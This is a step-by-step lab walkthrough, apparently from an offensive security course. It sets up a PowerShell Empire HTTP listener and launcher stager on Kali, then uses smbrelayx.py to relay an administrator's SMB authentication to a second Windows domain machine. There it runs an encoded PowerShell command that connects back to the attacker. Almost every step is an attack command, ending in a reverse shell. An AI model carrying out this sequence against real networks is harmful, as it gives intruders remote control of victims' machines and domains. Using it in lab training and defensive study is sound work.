In your Kali VM:

1. Start Empire

	./empire

2. In Empire, enter "listeners" submenu

	(Empire) > listeners
	
3. In "listeners" submenu, enter the following command:

	(Empire: listeners) > uselistener http

4. Enter "info" to see a list of options

	(Empire: listeners/http) > info

5. Set name to awae1

	(Empire: listeners/http) > set Name awae1

6. In another terminal, use ifconfig eth0 to obtain your IP address

	(Empire: listeners/http) > ifconfig eth0

7. set "Host" to http://<yourIPhere>:4444

	(Empire: listeners/http) > set Host http://10.10.10.102:4444

8. Start the listener

	(Empire: listeners/http) > execute

9. Enter "back" to return to the "listeners" submenu

	(Empire: listeners/http) > back

9. Enter "back" to return to the main menu

	(Empire: listeners) > back

10. Select a launcher stager

	(Empire) > usestager multi/launcher

11. Use the "info" command to see a list of options

	(Empire: stager/multi/launcher) > info

12. Select the listener we created earlier

	(Empire: stager/multi/launcher) > use Listener awae1

13. Display the listener on the screen

	(Empire: stager/multi/launcher) > execute


14. Set output to environment variable:
	

cmd='powershell -noP -sta -w 1 -enc  '

15. Start SMB Relay server, targeting Windows AD Victim 2. The -h flag is used to specify the
target's IP address. The -c flag is used to specify a command to run on the target machine.

	python smbrelayx.py -h <ip address of Windows AD Victim 2> -c $cmd

16. Log into Windows AD Victim 1 as EXAMPLE\Administrator

17. Attempt to access the SMB Share \\trololololo\lololollololol

18. Wait for reverse connection from Kali VM.
